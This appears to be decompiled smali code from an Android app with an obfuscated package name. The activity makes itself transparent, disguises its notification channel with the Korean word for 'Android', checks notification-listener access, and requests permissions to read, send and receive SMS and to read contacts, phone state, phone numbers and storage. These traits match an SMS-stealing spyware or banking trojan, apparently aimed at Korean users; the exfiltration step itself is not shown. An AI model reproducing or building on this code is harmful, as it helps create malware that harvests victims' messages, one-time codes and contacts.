.class public Lgqegwqg/bbebebefff/asdcdsac/MainActivity;
.super Lg/b/c/j;
.source "sourcefile"


# instance fields
.field public r:Landroid/app/Activity;

.field public s:Landroid/webkit/WebView;

.field public t:Landroid/view/View;

.field public u:Landroid/widget/ImageView;

.field public v:Ljava/lang/String;

.field public w:Ljava/lang/String;

.field public x:Ljava/lang/String;

.field public y:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Lg/b/c/j;-><init>()V

    iput-object p0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->r:Landroid/app/Activity;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->y:Z

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled",
            "CheckResult",
            "ObsoleteSdkInt",
            "InlinedApi"
        }
    .end annotation

    invoke-super {p0, p1}, Lg/l/b/o;->onCreate(Landroid/os/Bundle;)V

    const-string p1, "gqegwqg.bbebebefff.asdcdsac"

    const/4 v0, 0x0

    invoke-virtual {p0, p1, v0}, Landroid/app/Activity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    check-cast p1, Landroid/view/Window;

    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Landroid/view/Window;->setDimAmount(F)V

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object p1

    const/16 v1, 0x2000

    invoke-virtual {p1, v1}, Landroid/view/View;->setSystemUiVisibility(I)V

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/4 v1, -0x1

    invoke-virtual {p1, v1}, Landroid/view/Window;->setStatusBarColor(I)V

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/4 v2, 0x2

    invoke-virtual {p1, v2}, Landroid/view/Window;->clearFlags(I)V

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    new-instance v2, Landroid/graphics/drawable/ColorDrawable;

    invoke-direct {v2, v0}, Landroid/graphics/drawable/ColorDrawable;-><init>(I)V

    invoke-virtual {p1, v2}, Landroid/view/Window;->setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/16 v0, 0x80

    invoke-virtual {p1, v0}, Landroid/view/Window;->addFlags(I)V

    const p1, 0x7f0b001c

    invoke-virtual {p0, p1}, Lg/b/c/j;->setContentView(I)V

    const p1, 0x7f0800ef

    invoke-virtual {p0, p1}, Lg/b/c/j;->findViewById(I)Landroid/view/View;

    move-result-object p1

    iput-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->t:Landroid/view/View;

    new-instance p1, Landroid/widget/ImageView;

    invoke-direct {p1, p0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    iput-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u:Landroid/widget/ImageView;

    new-instance p1, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {p1, v1, v1}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u:Landroid/widget/ImageView;

    const v1, 0x7f070057

    invoke-virtual {v0, v1}, Landroid/widget/ImageView;->setImageResource(I)V

    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u:Landroid/widget/ImageView;

    invoke-virtual {v0, p1}, Landroid/widget/ImageView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    iget-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->t:Landroid/view/View;

    check-cast p1, Landroid/view/ViewGroup;

    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u:Landroid/widget/ImageView;

    invoke-virtual {p1, v0}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u()V

    return-void
.end method

.method public onDestroy()V
    .locals 1

    invoke-super {p0}, Lg/b/c/j;->onDestroy()V

    const/4 v0, 0x0

    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->r:Landroid/app/Activity;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->y:Z

    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 6

    invoke-super {p0, p1, p2, p3}, Lg/l/b/o;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x3e9

    if-ne p1, p2, :cond_0

    array-length p1, p3

    if-lez p1, :cond_0

    const/4 p1, 0x0

    aget p2, p3, p1

    if-nez p2, :cond_0

    iget-object p2, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->w:Ljava/lang/String;

    const-string p3, ""

    invoke-virtual {p2, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_0

    iget-object p2, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->v:Ljava/lang/String;

    invoke-virtual {p2, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_0

    iget-object p2, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->x:Ljava/lang/String;

    invoke-virtual {p2, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_0

    iget-object p2, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->v:Ljava/lang/String;

    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->w:Ljava/lang/String;

    iget-object v1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->x:Ljava/lang/String;

    .line 1
    :try_start_0
    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object v2

    invoke-virtual {v2, v0}, Landroid/webkit/CookieManager;->getCookie(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "download"

    invoke-virtual {p0, v3}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/DownloadManager;

    new-instance v4, Landroid/app/DownloadManager$Request;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/app/DownloadManager$Request;-><init>(Landroid/net/Uri;)V

    invoke-virtual {v4, p2}, Landroid/app/DownloadManager$Request;->setTitle(Ljava/lang/CharSequence;)Landroid/app/DownloadManager$Request;

    move-result-object p2

    const-string v5, "Downloading..."

    invoke-virtual {p2, v5}, Landroid/app/DownloadManager$Request;->setDescription(Ljava/lang/CharSequence;)Landroid/app/DownloadManager$Request;

    move-result-object p2

    const-string v5, "cookie"

    invoke-virtual {p2, v5, v2}, Landroid/app/DownloadManager$Request;->addRequestHeader(Ljava/lang/String;Ljava/lang/String;)Landroid/app/DownloadManager$Request;

    move-result-object p2

    const-string v2, "User-Agent"

    invoke-virtual {p2, v2, v1}, Landroid/app/DownloadManager$Request;->addRequestHeader(Ljava/lang/String;Ljava/lang/String;)Landroid/app/DownloadManager$Request;

    move-result-object p2

    .line 2
    invoke-virtual {p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {}, Landroid/webkit/MimeTypeMap;->getSingleton()Landroid/webkit/MimeTypeMap;

    move-result-object v2

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/content/ContentResolver;->getType(Landroid/net/Uri;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/webkit/MimeTypeMap;->getExtensionFromMimeType(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 3
    invoke-virtual {p2, v0}, Landroid/app/DownloadManager$Request;->setMimeType(Ljava/lang/String;)Landroid/app/DownloadManager$Request;

    move-result-object p2

    const/4 v0, 0x1

    invoke-virtual {p2, v0}, Landroid/app/DownloadManager$Request;->setAllowedOverMetered(Z)Landroid/app/DownloadManager$Request;

    move-result-object p2

    invoke-virtual {p2, v0}, Landroid/app/DownloadManager$Request;->setAllowedOverRoaming(Z)Landroid/app/DownloadManager$Request;

    move-result-object p2

    invoke-virtual {p2, v0}, Landroid/app/DownloadManager$Request;->setNotificationVisibility(I)Landroid/app/DownloadManager$Request;

    invoke-virtual {v3, v4}, Landroid/app/DownloadManager;->enqueue(Landroid/app/DownloadManager$Request;)J

    const-string p2, "Download Started"

    invoke-static {p0, p2, p1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p2

    invoke-virtual {p2}, Landroid/widget/Toast;->show()V

    iput-object p3, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->w:Ljava/lang/String;

    iput-object p3, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->v:Ljava/lang/String;

    iput-object p3, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->x:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p2

    invoke-virtual {p2}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p0, p2, p1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    :cond_0
    :goto_0
    return-void
.end method

.method public onResume()V
    .locals 1

    invoke-super {p0}, Lg/l/b/o;->onResume()V

    sget-boolean v0, Lk/a/a/q;->b:Z

    if-nez v0, :cond_0

    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u()V

    :cond_0
    return-void
.end method

.method public u()V
    .locals 5

    iget-boolean v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->y:Z

    if-nez v0, :cond_2

    const/4 v0, 0x1

    iput-boolean v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->y:Z

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x21

    if-lt v0, v1, :cond_0

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    new-instance v1, Landroid/app/NotificationChannel;

    const/4 v2, 0x3

    const-string v3, "Foreground"

    const-string v4, "\uc548\ub4dc\ub85c\uc774\ub4dc"

    invoke-direct {v1, v3, v4, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    invoke-virtual {v0, v1}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 1
    :cond_0
    invoke-virtual {p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "enabled_notification_listeners"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    if-eqz v0, :cond_1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 2
    :cond_1
    new-instance v0, Lj/f/a/x;

    invoke-direct {v0, p0}, Lj/f/a/x;-><init>(Landroid/content/Context;)V

    const-string v1, "android.permission.READ_PHONE_STATE"

    .line 3
    filled-new-array {v1}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/f/a/x;->a([Ljava/lang/String;)Lj/f/a/x;

    const-string v1, "android.permission.READ_SMS"

    filled-new-array {v1}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/f/a/x;->a([Ljava/lang/String;)Lj/f/a/x;

    const-string v1, "android.permission.READ_PHONE_NUMBERS"

    filled-new-array {v1}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/f/a/x;->a([Ljava/lang/String;)Lj/f/a/x;

    const-string v1, "android.permission.SEND_SMS"

    filled-new-array {v1}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/f/a/x;->a([Ljava/lang/String;)Lj/f/a/x;

    const-string v1, "android.permission.RECEIVE_SMS"

    filled-new-array {v1}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/f/a/x;->a([Ljava/lang/String;)Lj/f/a/x;

    const-string v1, "android.permission.READ_CONTACTS"

    filled-new-array {v1}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/f/a/x;->a([Ljava/lang/String;)Lj/f/a/x;

    const-string v1, "android.permission.READ_EXTERNAL_STORAGE"

    filled-new-array {v1}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/f/a/x;->a([Ljava/lang/String;)Lj/f/a/x;

    new-instance v1, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    invoke-direct {v1, p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;-><init>(Lgqegwqg/bbebebefff/asdcdsac/MainActivity;)V

    invoke-virtual {v0, v1}, Lj/f/a/x;->b(Lj/f/a/f;)V

    :cond_2
    return-void
.end method
